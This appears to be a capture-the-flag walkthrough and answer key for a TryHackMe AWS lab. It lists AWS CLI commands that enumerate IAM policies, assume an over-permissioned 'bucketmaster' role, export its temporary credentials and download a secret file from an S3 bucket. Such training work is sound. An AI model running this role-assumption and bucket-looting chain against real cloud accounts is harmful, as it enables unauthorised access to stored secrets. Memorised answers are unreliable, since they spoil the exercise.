# URL
https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6
# Concept
* AWS Security
* S3 Enumeration
# Method of solve
## Q1 - Run aws sts get-caller-identity. What is the number shown for the "Account" parameter?
* in the machine terminal, run the following command:
```
aws sts get-caller-identity
```
* the answer is the value of the `Account` key
## Q2 - What IAM component is used to describe the permissions to be assigned to a user or a group?
* the answer is `policy`
## Q3 - What is the name of the policy assigned to sir.carrotbane?
Run this command to get the policy name:
```
aws iam list-user-policies --user-name sir.carrotbane
```
## Q4 - Apart from GetObject and ListBucket, what other action can be taken by assuming the bucketmaster role?
* use the following command to get the `BucketMasterPolicy` policy that is attached to the `bucketmaster` role
```
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
```
## Q5 - What are the contents of the cloud_password.txt file?
* run the following command to get the credentials to become the `bucketmaster` role:
```
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
```
* next, run the following commands to use the credentials for the bucketmaster role:
```
export AWS_ACCESS_KEY_ID="value"
export AWS_SECRET_ACCESS_KEY="value"
export AWS_SESSION_TOKEN="value"
```
* replace the values with the values found from the previous command
* use the following command to confirm that we are the bucketmaster:
```
aws sts get-caller-identity
```
* this next command lets us see which buckets exist:
```
aws s3api list-buckets
```
* we see that there is the `easter-secrets-123145 bucket`, which we can then enumerate:
```
aws s3api list-objects --bucket easter-secrets-123145
```
* we want to copy the `cloud_password.txt` file to our machine:
```
aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
cat cloud_password.txt
```
